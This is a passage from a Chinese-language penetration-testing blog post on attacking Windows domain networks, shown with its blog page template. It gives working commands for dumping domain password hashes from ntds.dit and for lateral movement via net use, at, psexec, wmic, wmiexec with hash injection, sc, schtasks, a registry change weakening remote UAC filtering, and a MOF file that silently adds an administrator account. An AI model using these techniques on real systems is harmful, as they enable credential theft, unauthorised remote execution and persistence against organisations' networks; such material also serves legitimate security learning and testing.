+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">libesedb的搭建:</div><div class="line">wget https://github.com/libyal/libesedb/releases/download/20151213/libesedb-experimental-20151213.tar.gz</div><div class="line">tar zxvf libesedb-experimental-20151213.tar.gz</div><div class="line">cd libesedb-20151213/</div><div class="line">./configure</div><div class="line">make</div><div class="line">cd esedbtools/</div><div class="line">(需要把刚刚vbs脱下来的ntds.dit放到kali)</div><div class="line">./esedbexport ./ntds.dit</div><div class="line">mv ntds.dit.export/ ../../</div><div class="line"></div><div class="line">ntdsxtract工具的安装:</div><div class="line">wget http://www.ntdsxtract.com/downloads/ntdsxtract/ntdsxtract_v1_0.zip</div><div class="line">unzip ntdsxtract_v1_0.zip</div><div class="line">cd NTDSXtract 1.0/</div><div class="line">(需要把刚刚vbs脱下来的SYSTEM放到/root/SYSTEM)</div><div class="line">python dsusers.py ../ntds.dit.export/datatable.3 ../ntds.dit.export/link_table.5 --passwordhashes &apos;/root/SYSTEM&apos;</div></pre></td></tr></table></figure>
+<p><img src="./pic/5/16.jpg" alt=""></p>
+<h3 id="ntdsdump">ntdsdump</h3>
+<p>laterain的推荐：<a href="http://z-cg.com/post/ntds_dit_pwd_dumper.html" target="_blank" rel="external">http://z-cg.com/post/ntds_dit_pwd_dumper.html</a><br>
+是zcgonvh大牛根据quarkspwdump修改的，=。=，没找到和QuarkPwDump那个修改版的区别<br>
+获取ntds.dit和system.hiv之后(不用利用那个vbs导出,好像并不能分析出来)<br>
+<img src="./pic/5/17.jpg" alt=""></p>
+<h3 id="利用powershelldsinternals分析hash">利用powershell(DSInternals)分析hash</h3>
+<p>查看powershell版本：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$PSVersionTable.PSVersion</div><div class="line">看第一个Major</div><div class="line">或者</div><div class="line">Get-Host | Select-Object Version</div></pre></td></tr></table></figure>
+<p>Windows Server 2008 R2默认环境下PowerShell版本2.0，应该升级到3.0版本以上,<a href="http://xn--dw2at9x.NET" target="_blank" rel="external">需要.NET</a> Framework 4.0</p>
+<p>需要文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ntds.dit(vshadow获取)</div><div class="line">system(reg获取)</div></pre></td></tr></table></figure>
+<p>执行命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">允许执行脚本：</div><div class="line">Set-ExecutionPolicy Unrestricted</div><div class="line"></div><div class="line">导入模块(测试是win2012_powershell ver4.0)：</div><div class="line">Import-Module .\DSInternals</div><div class="line">(powershell ver5.0)</div><div class="line">Install-Module DSInternals</div><div class="line"></div><div class="line">分析hash,并导出到当前目录的hash.txt文件中</div><div class="line">1、$key = Get-BootKey -SystemHivePath &apos;C:\Users\administrator\Desktop\SYSTEM&apos;</div><div class="line">2、Get-ADDBAccount -All -DBPath &apos;C:\Users\administrator\Desktop\ntds.dit&apos; -BootKey $key | Out-File hash.txt</div></pre></td></tr></table></figure>
+<p><img src="./pic/5/18.jpg" alt=""></p>
+<p>这个只是离线分析了ntds.dit文件,其实也可以在线操作,=。=,不过感觉实战中遇到的会比较少,毕竟现在主流是win08为域控(以后这个倒不失为一个好方法)<br>
+更多详情参考三好学生大牛的文章：<a href="http://drops.wooyun.org/tips/10181" target="_blank" rel="external">http://drops.wooyun.org/tips/10181</a></p>
+<hr>
+<h2 id="远程连接ampamp执行程序">远程连接&amp;&amp;执行程序</h2>
+<h3 id="atampschtasks">at&amp;schtasks</h3>
+<p>需要开启Task Scheduler服务<br>
+经典流程：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">1、进行一个连接</div><div class="line">net use \\10.10.24.44\ipc$ 密码 /user:账号</div><div class="line"></div><div class="line">2、复制本地文件到10.10.24.44的share共享目录(一般是放入admin$这个共享地方(也就是c:\winnt\system32\)，或者c$，d$)</div><div class="line">copy 4.bat \\10.10.24.44\share</div><div class="line"></div><div class="line">3、查看10.10.24.44服务器的时间</div><div class="line">net time \\10.10.24.44</div><div class="line"></div><div class="line">4、添加at任务执行</div><div class="line">at \\10.10.24.44 6:21 \\10.10.24.44\share\4.bat</div><div class="line">这个6:21指的是上午的时间，如果想添加下午的，则是6.21PM</div><div class="line"></div><div class="line">5、查看添加的所有at任务列表(如果执行了得，就不会显示)</div><div class="line">at \\10.10.24.44</div></pre></td></tr></table></figure>
+<p>其他命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">查看所有连接</div><div class="line">net use</div><div class="line">删除连接</div><div class="line">net use \\10.10.24.44\share /del</div><div class="line"></div><div class="line">映射共享磁盘到本地</div><div class="line">net use z: \\IP\c$ &quot;密码&quot; /user:&quot;用户名&quot;</div><div class="line">删除共享映射</div><div class="line">net use c: /del</div><div class="line">net use * /del</div></pre></td></tr></table></figure>
+<p><strong>at过去后如果找不到网络路径,则判断是目标主机已禁用Task Scheduler服务</strong></p>
+<h3 id="psexec">psexec</h3>
+<p>第一次运行会弹框,输入–accepteula这个参数就可以绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">psexec.exe \\ip –accepteula -u username -p password program.exe</div></pre></td></tr></table></figure>
+<p><img src="./pic/6/1.jpg" alt=""></p>
+<p>另外两个比较重要的参数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">-c &lt;[路径]文件名&gt;:拷贝文件到远程机器并运行（注意：运行结束后文件会自动删除）</div><div class="line">-d 不等待程序执行完就返回</div><div class="line">比如想上传一个本地的getpass到你远程连接的服务器上去:</div><div class="line">Psexec.exe \\ip –u user –p pass –c c:\getpass.exe –d</div></pre></td></tr></table></figure>
+<p>另外学习一波pstools的一些运用：<br>
+<a href="http://blog.csdn.net/sysprogram/article/details/13001781" target="_blank" rel="external">http://blog.csdn.net/sysprogram/article/details/13001781</a></p>
+<p><strong>如果出现找不到网络名，判断目标主机已禁用ADMIN$共享</strong></p>
+<h3 id="wmic">wmic</h3>
+<p>net use后：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">copy 1.bat \\host\c$\windows\temp\1.bat</div><div class="line"></div><div class="line">wmic /node:ip /user:test /password:testtest process call create c:\windows\temp\1.bat</div></pre></td></tr></table></figure>
+<p><img src="./pic/6/2.jpg" alt=""></p>
+<p>ps:<br>
+如果出现User credentials cannot be used for local connections,应该是调用了calc.exe权限不够的问题<br>
+如果出现Description = 无法启动服务，原因可能是已被禁用或与其相关联的设备没有启动，判断WMI服务被禁用</p>
+<h3 id="wmiexecvbs">wmiexec.vbs</h3>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">1、半交互模式</div><div class="line">cscript.exe //nologo wmiexec.vbs /shell ip username password</div><div class="line">2、单命令执行</div><div class="line">cscript.exe wmiexec.vbs /cmd ip username password &quot;command&quot;</div><div class="line">3、wce_hash注入</div><div class="line">如果抓取的LM hash是AAD3开头的，或者是No Password之类的，就用32个0代替LM hash</div><div class="line">wce -s hash</div><div class="line">cscript.exe //nologo wmiexec.vbs /shell ip</div></pre></td></tr></table></figure>
+<p><img src="./pic/6/3.jpg" alt=""><br>
+wmi只是创建进程,没办法去判断一个进程是否执行完成(比如ping),这样就导致wmi.dll删除不成,下一次又是被占用,这时候修改一下vbs里面的名字就好：<code>Const FileName = &quot;wmi1.dll&quot;</code>,也可以加入<code>-persist</code>参数(后台运行)</p>
+<p>另外有一个uac问题<br>
+<strong>非域用户</strong>登陆到win08和2012中,只有administrator可以登陆成功,其他管理员账号会出现WMIEXEC ERROR: Access is denied<br>
+需要在win08或者2012上面执行,然后才可以连接:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</div></pre></td></tr></table></figure>
+<p><img src="./pic/6/4.jpg" alt=""></p>
+<p>想更详细了解的可以看看：<a href="https://www.91ri.org/12908.html" target="_blank" rel="external">https://www.91ri.org/12908.html</a></p>
+<h3 id="smbexec">smbexec</h3>
+<p>这个可以根据其他共享(c$、ipc$)来获取一个cmd</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">先把execserver.exe复制到目标的windows目录下,然后本机执行</div><div class="line">test.exe ip user pass command sharename</div></pre></td></tr></table></figure>
+<p><img src="./pic/6/5.jpg" alt=""></p>
+<h3 id="powershell-remoting">powershell remoting</h3>
+<p>感觉实质上还是操作wmi实现的一个执行程序</p>
+<p><a href="https://github.com/samratashok/nishang/blob/5da8e915fcd56fc76fc16110083948e106486af0/Shells/Invoke-PowerShellWmi.ps1" target="_blank" rel="external">https://github.com/samratashok/nishang/blob/5da8e915fcd56fc76fc16110083948e106486af0/Shells/Invoke-PowerShellWmi.ps1</a></p>
+<h3 id="sc创建服务执行">SC创建服务执行</h3>
+<p>一定要注意的是binpath这些设置的后面是有一个<strong>空格</strong>的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">1、系统权限(其中test为服务名)</div><div class="line">sc \\DC1 create test binpath= c:\cmd.exe</div><div class="line">sc \\DC1 start test</div><div class="line">sc \\DC1 delete test</div><div class="line"></div><div class="line">2.指定用户权限启动</div><div class="line">sc \\DC1 create test binpath = &quot;c:\1.exe&quot; obj= &quot;centoso\administrator&quot; passwrod= test</div><div class="line">sc \\DC1 start test</div></pre></td></tr></table></figure>
+<h3 id="schtasks">schtasks</h3>
+<p>schtasks计划任务远程运行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">命令原型：</div><div class="line">schtasks /create /tn TaskName /tr TaskRun /sc schedule [/mo modifier] [/d day] [/m month[,month...] [/i IdleTime] [/st StartTime] [/sd StartDate] [/ed EndDate] [/s computer [/u [domain\]user /p password]] [/ru &#123;[Domain\]User | &quot;System&quot;&#125; [/rp Password]] /?</div><div class="line"></div><div class="line">For example:</div><div class="line">schtasks /create /tn foobar /tr c:\windows\temp\foobar.exe /sc once /st 00:00 /S host /RU System</div><div class="line">schtasks /run /tn foobar /S host</div><div class="line">schtasks /F /delete /tn foobar /S host</div></pre></td></tr></table></figure>
+<p>验证失败：win03连到08,xp连到08,xp连到03(但是并没有真正的成功执行,不知道是不是有姿势错了)<br>
+<img src="./pic/6/6.jpg" alt=""></p>
+<p>更多用法：<a href="http://www.feiesoft.com/windows/cmd/schtasks.htm" target="_blank" rel="external">http://www.feiesoft.com/windows/cmd/schtasks.htm</a></p>
+<h3 id="smbmof-dll-hijacks">SMB+MOF || DLL Hijacks</h3>
+<p>其实这个思路一般都有用到的,比如在mof提权(上传mof文件到c:/windows/system32/wbem/mof/mof.mof)中,lpk_dll劫持<br>
+不过测试添加账号成功…执行文件缺失败了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)</div><div class="line"></div><div class="line">instance of __EventFilter as $EventFilter</div><div class="line">&#123;</div><div class="line">    EventNamespace = &quot;Root\\Cimv2&quot;;</div><div class="line">    Name  = &quot;filtP2&quot;;</div><div class="line">    Query = &quot;Select * From __InstanceModificationEvent &quot;</div><div class="line">            &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</div><div class="line">            &quot;And TargetInstance.Second = 5&quot;;</div><div class="line">    QueryLanguage = &quot;WQL&quot;;</div><div class="line">&#125;;</div><div class="line">instance of ActiveScriptEventConsumer as $Consumer</div><div class="line">&#123;</div><div class="line">    Name = &quot;consPCSV2&quot;;</div><div class="line">    ScriptingEngine = &quot;JScript&quot;;</div><div class="line">    ScriptText =</div><div class="line">    &quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user admin adminaz1 /add\&quot;)&quot;;</div><div class="line">&#125;;</div><div class="line">instance of __FilterToConsumerBinding</div><div class="line">&#123;</div><div class="line">    Consumer   = $Consumer;</div><div class="line">    Filter = $EventFilter;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
+<h3 id="pth-compmgmtmsc">PTH + compmgmt.msc</h3>
+<p><img src="./pic/6/7.jpg" alt=""></p>
+<p><a href="http://drops.wooyun.org/tips/7358" target="_blank" rel="external">http://drops.wooyun.org/tips/7358</a></p>
+
+                
+
+                <hr>
+                <!-- Pager -->
+                <ul class="pager">
+                    
+                    
+                        <li class="next">
+                            <a href="/2017/05/29/xxe/" data-toggle="tooltip" data-placement="top" title="XXE">Next Post &rarr;</a>
+                        </li>
+                    
+                </ul>
+
+                <!-- duoshuo Share start -->
+                
+                <!-- 多说 Share end-->
+
+                <!-- 多说评论框 start -->
+                
+                <!-- 多说评论框 end -->
+
+                <!-- disqus comment start -->
+                
+                    <div class="comment">
+                        <div id="disqus_thread" class="disqus-thread"></div>
+                    </div>
+                
+                <!-- disqus comment end -->
+            </div>
+            
+            <!-- Tabe of Content -->
+            <!-- Table of Contents -->
+
+    
+      <aside id="sidebar">
+        <div id="toc" class="toc-article">
+        <strong class="toc-title">Contents</strong>
+        
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#域环境搭建"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">域环境搭建</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#端口转发ampamp边界代理"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">端口转发&&边界代理</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#端口转发"><span class="toc-nav-number">2.1.</span> <span class="toc-nav-text">端口转发</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#socket代理"><span class="toc-nav-number">2.2.</span> <span class="toc-nav-text">socket代理</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#神器推荐"><span class="toc-nav-number">2.3.</span> <span class="toc-nav-text">神器推荐</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#基于http的转发与socket代理低权限下的渗透"><span class="toc-nav-number">2.4.</span> <span class="toc-nav-text">基于http的转发与socket代理(低权限下的渗透)</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#ssh通道"><span class="toc-nav-number">2.5.</span> <span class="toc-nav-text">ssh通道</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#获取shell"><span class="toc-nav-number">3.</span> <span class="toc-nav-text">获取shell</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#常规shell反弹"><span class="toc-nav-number">3.1.</span> <span class="toc-nav-text">常规shell反弹</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#突破防火墙的imcp_shell反弹"><span class="toc-nav-number">3.2.</span> <span class="toc-nav-text">突破防火墙的imcp_shell反弹</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#shell反弹不出的时候"><span class="toc-nav-number">3.3.</span> <span class="toc-nav-text">Shell反弹不出的时候</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#正向shell"><span class="toc-nav-number">3.4.</span> <span class="toc-nav-text">正向shell</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#信息收集结构分析"><span class="toc-nav-number">4.</span> <span class="toc-nav-text">信息收集(结构分析)</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#基本命令"><span class="toc-nav-number">4.1.</span> <span class="toc-nav-text">基本命令</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#定位域控"><span class="toc-nav-number">4.2.</span> <span class="toc-nav-text">定位域控</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#端口收集"><span class="toc-nav-number">4.3.</span> <span class="toc-nav-text">端口收集</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#扫描分析"><span class="toc-nav-number">4.4.</span> <span class="toc-nav-text">扫描分析</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#内网文件传输"><span class="toc-nav-number">5.</span> <span class="toc-nav-text">内网文件传输</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#windows下文件传输"><span class="toc-nav-number">5.1.</span> <span class="toc-nav-text">windows下文件传输</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#linux下文件传输"><span class="toc-nav-number">5.2.</span> <span class="toc-nav-text">linux下文件传输</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#其他传输方式"><span class="toc-nav-number">5.3.</span> <span class="toc-nav-text">其他传输方式</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#文件编译"><span class="toc-nav-number">5.4.</span> <span class="toc-nav-text">文件编译</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#hash抓取"><span class="toc-nav-number">6.</span> <span class="toc-nav-text">hash抓取</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#hash简介"><span class="toc-nav-number">6.1.</span> <span class="toc-nav-text">hash简介</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#本机hash明文抓取"><span class="toc-nav-number">6.2.</span> <span class="toc-nav-text">本机hash+明文抓取</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#win8win2012明文抓取"><span class="toc-nav-number">6.3.</span> <span class="toc-nav-text">win8+win2012明文抓取</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#mimikatz"><span class="toc-nav-number">6.4.</span> <span class="toc-nav-text">mimikatz</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#ntdsdit的导出quarkpwdump读取分析"><span class="toc-nav-number">6.5.</span> <span class="toc-nav-text">ntds.dit的导出+QuarkPwDump读取分析</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#vssownvbs-libesedb-ntdsxtract"><span class="toc-nav-number">6.6.</span> <span class="toc-nav-text">vssown.vbs + libesedb + NtdsXtract</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#ntdsdump"><span class="toc-nav-number">6.7.</span> <span class="toc-nav-text">ntdsdump</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#利用powershelldsinternals分析hash"><span class="toc-nav-number">6.8.</span> <span class="toc-nav-text">利用powershell(DSInternals)分析hash</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#远程连接ampamp执行程序"><span class="toc-nav-number">7.</span> <span class="toc-nav-text">远程连接&&执行程序</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#atampschtasks"><span class="toc-nav-number">7.1.</span> <span class="toc-nav-text">at&schtasks</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#psexec"><span class="toc-nav-number">7.2.</span> <span class="toc-nav-text">psexec</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#wmic"><span class="toc-nav-number">7.3.</span> <span class="toc-nav-text">wmic</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#wmiexecvbs"><span class="toc-nav-number">7.4.</span> <span class="toc-nav-text">wmiexec.vbs</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#smbexec"><span class="toc-nav-number">7.5.</span> <span class="toc-nav-text">smbexec</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#powershell-remoting"><span class="toc-nav-number">7.6.</span> <span class="toc-nav-text">powershell remoting</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#sc创建服务执行"><span class="toc-nav-number">7.7.</span> <span class="toc-nav-text">SC创建服务执行</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#schtasks"><span class="toc-nav-number">7.8.</span> <span class="toc-nav-text">schtasks</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#smbmof-dll-hijacks"><span class="toc-nav-number">7.9.</span> <span class="toc-nav-text">SMB+MOF || DLL Hijacks</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#pth-compmgmtmsc"><span class="toc-nav-number">7.10.</span> <span class="toc-nav-text">PTH + compmgmt.msc</span></a></li></ol></li></ol>
+        
+        </div>
+      </aside>
+    
+
+                
+            <!-- Sidebar Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#Web" title="Web">Web</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
+
+                    
+                        <li><a href="http://beantech.org" target="_blank">Bean Tech</a></li>
+                    
+                        <li><a href="http://blog.kaijun.rocks" target="_blank">Kaijun&#39;s Blog</a></li>
+                    
+                        <li><a href="http://huangxuan.me" target="_blank">Hux Blog</a></li>
+                    
+                        <li><a href="#" target="_blank">It Helps SEO</a></li>
+                    
+                </ul>
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+
+
+
+<!-- disqus embedded js code start (one page only need to embed once) -->
+<script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES * * */
+    var disqus_shortname = "your-disqus-ID";
+    var disqus_identifier = "http://rootclay.github.io/2017/05/29/内网/";
+    var disqus_url = "http://rootclay.github.io/2017/05/29/内网/";
+
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<!-- disqus embedded js code start end -->
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'hover',
+          placement: 'left',
+          icon: 'ℬ'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                
+                
+                    <li>
+                        <a target="_blank" href="https://www.zhihu.com/people/xiang-shan-74-8">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa  fa-stack-1x fa-inverse">知</i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+                    <li>
+                        <a target="_blank" href="http://weibo.com/u/5715481982">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-weibo fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/rootclay">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Rootclay 2017 
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("http://rootclay.github.io/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+<script>
+    // dynamic User by Hux
+    var _gaId = 'UA-XXXXXXXX-X';
+    var _gaDomain = 'yoursite';
+
+    // Originial
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', _gaId, _gaDomain);
+    ga('send', 'pageview');
+</script>
+
+
+
+
+<!-- Baidu Tongji -->
+
+
+
+
+
+
+	<a id="rocket" href="#top" class=""></a>
+	<script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
+    <script type="text/javascript" src="/js/toc.js?v=1.0.0" async=""></script>
+<!-- Image to hack wechat -->
+<!-- <img src="http://rootclay.github.io/img/icon_wechat.png" width="0" height="0" /> -->
